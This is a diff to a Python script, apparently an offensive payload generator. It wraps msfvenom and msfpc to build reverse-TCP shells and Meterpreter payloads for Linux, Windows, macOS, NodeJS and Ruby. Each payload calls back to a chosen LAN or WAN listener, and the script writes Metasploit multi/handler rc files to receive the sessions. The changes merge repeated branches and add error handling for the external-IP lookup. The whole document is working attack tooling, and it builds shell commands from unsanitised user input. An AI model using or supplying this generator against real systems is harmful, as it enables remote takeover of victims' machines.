@@ -14,15 +14,21 @@ def signal_handler(sig, frame):
 
 def ask_listener():
     lan = ([l for l in ([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")][:1], [[(s.connect(('10.255.255.255', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]]) if l][0][0])
-    wan = request.urlopen('https://api.ipify.org').readline().decode('utf-8')
+    wan = None
+    try:
+        wan = request.urlopen('https://api.ipify.org').readline().decode('utf-8')
+    except:
+        print('Could not automatically determine external IP address.')
+        print('Please try again later or input manually!')
     print(f'{choice(color)}For LAN enter 1: {lan}')
-    print(f'{choice(color)}For WAN enter 2: {wan}')
+    if wan:
+        print(f'{choice(color)}For WAN enter 2: {wan}')
     while True:
         cw = input('Which one do you want, LAN or WAN?: ')
         if cw == '1':
             ipp = lan
             break
-        elif cw == '2':
+        elif cw == '2' and wan:
             ipp = wan
             break
         print('Invalid input.')
@@ -185,7 +191,9 @@ def payload():
     ipp, port = ask_listener()
 
     msfpc_format = None
-    msfvenom_rc = None
+    msfvenom_command = None
+    msfvenom_extension = None
+    msfvenom_extra = ''
     #Binaries
     if ven == '1':
         msfpc_format = 'elf'
@@ -203,22 +211,8 @@ def payload():
     if ven == '7':
         msfpc_format = 'war'
     if ven == '8':
-        shell_file = f'nodejs-reverse-tcp-{port}.js'
-        os.system(f'msfvenom -p nodejs/shell_reverse_tcp LHOST={ipp} LPORT={port} > "{shell_file}"')
-        print(f'NodeJS shell created: {os.getcwd()}/{shell_file}')
-        msfvenom_rc = f'nodejs-reverse-tcp-{port}-js.rc'
-        with open(msfvenom_rc, 'w') as rc:
-            rc.write(f"""#
-# [Kali]: msfdb start; msfconsole -q -r '{os.getcwd()}/{shell_file}'
-#
-use exploit/multi/handler
-set PAYLOAD nodejs/shell_reverse_tcp
-set LHOST {ipp}
-set LPORT {port}
-set ExitOnSession false
-set EnableStageEncoding true
-#set AutoRunScript 'post/windows/manage/migrate'
-run -j""")
+        msfvenom_command = 'nodejs/shell_reverse_tcp'
+        msfvenom_extension = 'js'
 
     #Scripting
     if ven == '9':
@@ -228,81 +222,53 @@ run -j""")
     if ven == '11':
         msfpc_format = 'perl'
     if ven == '12':
-        shell_file = f'ruby-reverse-tcp-{port}.rb'
-        os.system(f'msfvenom -p ruby/shell_reverse_tcp LHOST={ipp} LPORT={port} > "{shell_file}"')
-        print(f'Ruby shell created: {os.getcwd()}/{shell_file}')
-        msfvenom_rc = f'ruby-reverse-tcp-{port}-rb.rc'
+        msfvenom_command = 'ruby/shell_reverse_tcp'
+        msfvenom_extension = 'rb'
+
+    #Shellcode
+    if ven == '13':
+        msfvenom_command = 'linux/x86/meterpreter/reverse_tcp'
+        dil = input('Enter language: ')
+        if dil.rstrip() == '':
+            dil = 'raw'
+        msfvenom_extra = f' -f {dil}'
+        msfvenom_extension = dil
+    if ven == '14':
+        msfvenom_command = 'windows/meterpreter/reverse_tcp'
+        dil = input('Enter language: ')
+        if dil.rstrip() == '':
+            dil = 'raw'
+        msfvenom_extra = f' -f {dil}'
+        msfvenom_extension = dil
+    if ven == '15':
+        msfvenom_command = 'osx/x86/shell_reverse_tcp'
+        dil = input('Enter language: ')
+        if dil.rstrip() == '':
+            dil = 'raw'
+        msfvenom_extra = f' -f {dil}'
+        msfvenom_extension = dil
+
+    if msfpc_format:
+        msfpc = subprocess.run(['msfpc', msfpc_format, ipp, port], capture_output=True)
+        print(msfpc.stdout.decode('utf-8'))
+        spawn_shell = msfpc.stdout.decode("utf-8").split("Run: ")[1].splitlines()[0]
+    elif msfvenom_command and msfvenom_extension:
+        payload = f'{msfvenom_command.replace("/", "-").replace("_", "-")}-{port}.{msfvenom_extension}'
+        os.system(f'msfvenom -p {msfvenom_command} LHOST={ipp} LPORT={port}{msfvenom_extra} > "{payload}"')
+        print(f'Payload created: {os.getcwd()}/{payload}')
+        msfvenom_rc = f'{msfvenom_command.replace("/", "-").replace("_", "-")}-{port}-{msfvenom_extension}.rc'
         with open(msfvenom_rc, 'w') as rc:
             rc.write(f"""#
-# [Kali]: msfdb start; msfconsole -q -r '{os.getcwd()}/{shell_file}'
+# [Kali]: msfdb start; msfconsole -q -r '{os.getcwd()}/{payload}'
 #
 use exploit/multi/handler
-set PAYLOAD ruby/shell_reverse_tcp
+set PAYLOAD {msfvenom_command}
 set LHOST {ipp}
 set LPORT {port}
 set ExitOnSession false
 set EnableStageEncoding true
 #set AutoRunScript 'post/windows/manage/migrate'
 run -j""")
-
-    #Shellcode
-    if ven == '13':
-        dil = input('Enter language: ')
-        shell_file = f'linux-x86-meterpreter-reverse-tcp-{port}.{dil}'
-        os.system(f'msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={ipp} LPORT={port} -f {dil} > "{shell_file}"')
-        print(f'{dil} shellcode created: {os.getcwd()}/{shell_file}')
-        msfvenom_rc = f'linux-x86-meterpreter-reverse-tcp-{port}-{dil}.rc'
-        with open(msfvenom_rc, 'w') as rc:
-            rc.write(f"""#
-# [Kali]: msfdb start; msfconsole -q -r '{os.getcwd()}/{shell_file}'
-#
-use exploit/multi/handler
-set PAYLOAD linux/x86/meterpreter/reverse_tcp
-set LHOST {ipp}
-set LPORT {port}
-set ExitOnSession false
-set EnableStageEncoding true
-run -j""")
-    if ven == '14':
-        dil = input('Enter language: ')
-        shell_file = f'windows-meterpreter-reverse-tcp-{port}.{dil}'
-        os.system(f'msfvenom -p windows/meterpreter/reverse_tcp LHOST={ipp} LPORT={port} -f {dil} > "{shell_file}"')
-        print(f'{dil} shellcode created: {os.getcwd()}/{shell_file}')
-        msfvenom_rc = f'windows-meterpreter-reverse-tcp-{port}-{dil}.rc'
-        with open(msfvenom_rc, 'w') as rc:
-            rc.write(f"""#
-# [Kali]: msfdb start; msfconsole -q -r '{os.getcwd()}/{shell_file}'
-#
-use exploit/multi/handler
-set PAYLOAD windows/meterpreter/reverse_tcp
-set LHOST {ipp}
-set LPORT {port}
-set ExitOnSession false
-set EnableStageEncoding true
-run -j""")
-    if ven == '15':
-        dil = input('Enter language: ')
-        shell_file = f'osx-x86-shell-reverse-tcp-{port}.{dil}'
-        os.system(f'msfvenom -p osx/x86/shell_reverse_tcp LHOST={ipp} LPORT={port} -f {dil} > "{shell_file}"')
-        print(f'{dil} shellcode created: {os.getcwd()}/{shell_file}')
-        msfvenom_rc = f'osx-x86-shell-reverse-tcp-{port}-{dil}.rc'
-        with open(msfvenom_rc, 'w') as rc:
-            rc.write(f"""#
-# [Kali]: msfdb start; msfconsole -q -r '{os.getcwd()}/{shell_file}'
-#
-use exploit/multi/handler
-set PAYLOAD osx/x86/shell_reverse_tcp
-set LHOST {ipp}
-set LPORT {port}
-set ExitOnSession false
-set EnableStageEncoding true
-run -j""")
-
-    if msfpc_format:
-        msfpc = subprocess.run(['msfpc', msfpc_format, ipp, port], capture_output=True)
-        print(msfpc.stdout.decode('utf-8'))
-        spawn_shell = msfpc.stdout.decode("utf-8").split("Run: ")[1].splitlines()[0]
-    elif msfvenom_rc:
         spawn_shell = f'msfconsole -q -r {os.getcwd()}/{msfvenom_rc}'
         print('')
     else:
